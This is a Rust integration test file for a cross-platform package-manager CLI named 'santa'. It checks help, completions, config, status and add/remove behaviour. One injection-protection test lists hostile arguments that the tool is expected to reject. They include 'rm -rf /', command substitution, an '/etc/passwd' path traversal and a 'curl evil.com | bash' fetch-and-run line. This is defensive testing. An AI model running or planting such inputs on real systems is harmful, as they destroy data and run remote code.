use assert_cmd::prelude::*;
use predicates::prelude::*;
use std::io::Write;
use std::process::Command;
use tempfile::NamedTempFile;

// Include the new integration test modules
mod e2e;
mod integration;

#[test]
fn test_cli_help() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("--help");
    cmd.assert().success().stdout(predicate::str::contains(
        "a tool that manages packages across different platforms",
    ));
}

#[test]
fn test_cli_version() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("--version");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("santa"));
}

#[test]
fn test_config_builtin_only() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("name: Brew"))
        .stdout(predicate::str::contains("emoji: \"🍺\""));
}

#[test]
fn test_completions_bash() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["completions", "bash"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("_santa"))
        .stdout(predicate::str::contains("complete"));
}

#[test]
fn test_completions_zsh() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["completions", "zsh"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("#compdef santa"));
}

#[test]
fn test_completions_fish() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["completions", "fish"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("complete"));
}

#[test]
fn test_status_with_builtin() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--builtin-only"]);

    // This test documents current behavior - may show missing packages
    // which is expected since we don't have the actual package managers installed
    cmd.assert().success();
}

#[test]
fn test_status_all_with_builtin() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--all", "--builtin-only"]);

    cmd.assert().success();
}

#[test]
fn test_add_command_validates_packages() {
    // The add command now validates packages against the database
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["add", "nonexistent_package", "--builtin-only"]);
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("not found in database"));
}

#[test]
fn test_verbose_logging() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only", "-v"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("loading built-in config"));
}

#[test]
fn test_very_verbose_logging() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only", "-vv"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("DEBUG"));
}

#[test]
fn test_invalid_subcommand() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("invalid_command");
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("error"));
}

#[test]
fn test_config_with_custom_file() {
    // Create a temporary config file in CCL format
    let config_content = r#"
sources =
  = brew
  = cargo
packages =
  = git
  = rust
"#;

    let mut temp_file = NamedTempFile::new().unwrap();
    write!(temp_file, "{config_content}").unwrap();

    // Test that we can load custom config (this will fail since the file path is different)
    // This test documents the current behavior and the need for better config file handling
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only"]);

    // This will use builtin config since we can't point to our temp file location
    cmd.assert().success();
}

#[test]
fn test_security_command_injection_protection() {
    // Test that dangerous command line arguments don't cause issues
    let dangerous_args = vec![
        "; rm -rf /",
        "$(evil_command)",
        "`dangerous`",
        "../../etc/passwd",
        "&& curl evil.com | bash",
    ];

    for dangerous_arg in dangerous_args {
        // Test with add command - dangerous arguments should fail safely
        // by failing validation rather than being executed
        let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
        cmd.args(["add", dangerous_arg, "--builtin-only"]);
        cmd.assert()
            .failure()
            .stderr(predicate::str::contains("not found in database"));

        // The dangerous argument is safely rejected during validation
        // rather than being executed - this is the correct behavior
    }
}

#[test]
fn test_config_output_format() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("name: Brew"))
        .stdout(predicate::str::contains("emoji:"))
        .stdout(predicate::str::contains("install_command:"));
}

#[test]
fn test_no_arguments_shows_help() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("Usage:"))
        .stdout(predicate::str::contains("Commands:"));
}

#[test]
fn test_markdown_help_generation() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("--markdown-help");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("# Command-Line Help for `santa`"))
        .stdout(predicate::str::contains("## `santa`"))
        .stdout(predicate::str::contains("## `santa status`"));
}

#[test]
fn test_config_packages_flag() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--packages", "--builtin-only"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("packages:"))
        .stdout(predicate::str::contains("sources:"));
}

// Integration test for the full workflow
#[test]
fn test_full_workflow_simulation() {
    // This test simulates a complete user workflow

    // 1. Check help
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("--help");
    cmd.assert().success();

    // 2. Check current status
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--builtin-only"]);
    cmd.assert().success();

    // 3. View configuration
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only"]);
    cmd.assert().success();

    // 4. Generate shell completions
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["completions", "bash"]);
    cmd.assert().success();

    // This test ensures the basic CLI workflow works end-to-end
}

// Tests for new CLI options added in feature/ws1-cli-features branch

#[test]
fn test_status_with_installed_flag() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--installed", "--builtin-only"]);
    cmd.assert().success();
}

#[test]
fn test_status_with_missing_flag() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--missing", "--builtin-only"]);
    cmd.assert().success();
}

#[test]
fn test_status_with_source_filter() {
    // This may fail if brew is not an enabled source, but should not crash
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--source", "brew", "--builtin-only"]);
    // The command should either succeed or fail gracefully with an error message
    let output = cmd.output().expect("Failed to execute command");
    // Just verify it doesn't panic/crash
    assert!(
        output.status.success()
            || String::from_utf8_lossy(&output.stderr).contains("not found or not enabled")
    );
}

#[test]
fn test_status_flags_are_mutually_exclusive() {
    // --all and --installed should conflict
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--all", "--installed", "--builtin-only"]);
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with"));

    // --all and --missing should conflict
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--all", "--missing", "--builtin-only"]);
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with"));

    // --installed and --missing should conflict
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--installed", "--missing", "--builtin-only"]);
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("cannot be used with"));
}

#[test]
fn test_config_option_with_nonexistent_file() {
    // Test --config with a non-existent file
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--config", "/nonexistent/path/config.ccl"]);
    // Should fail with an error about the file not existing
    cmd.assert().failure();
}

#[test]
fn test_config_option_with_valid_file() {
    // Create a temp config file
    let config_content = r#"
sources =
  = brew
packages =
  = git
"#;
    let mut temp_file = NamedTempFile::new().unwrap();
    write!(temp_file, "{config_content}").unwrap();

    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--config", temp_file.path().to_str().unwrap()]);
    cmd.assert().success();
}

#[test]
fn test_remove_command_exists() {
    // Verify the remove command is recognized
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["remove", "--help"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("Remove"));
}

#[test]
fn test_remove_command_requires_packages() {
    // Remove command should require at least one package
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["remove", "--builtin-only"]);
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("No packages specified"));
}

#[test]
fn test_add_command_requires_packages() {
    // Add command should require at least one package
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["add", "--builtin-only"]);
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("No packages specified"));
}

#[test]
fn test_add_command_with_builtin_only_validates_but_does_not_add() {
    // In builtin-only mode, add should validate packages but not modify config
    // Use 'wget' which is in the builtin package database
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["add", "wget", "--builtin-only"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("exists in database"))
        .stdout(predicate::str::contains("builtin-only mode"));
}

#[test]
fn test_remove_command_with_uninstall_flag() {
    // Test that --uninstall flag is recognized
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["remove", "--help"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("uninstall"));
}
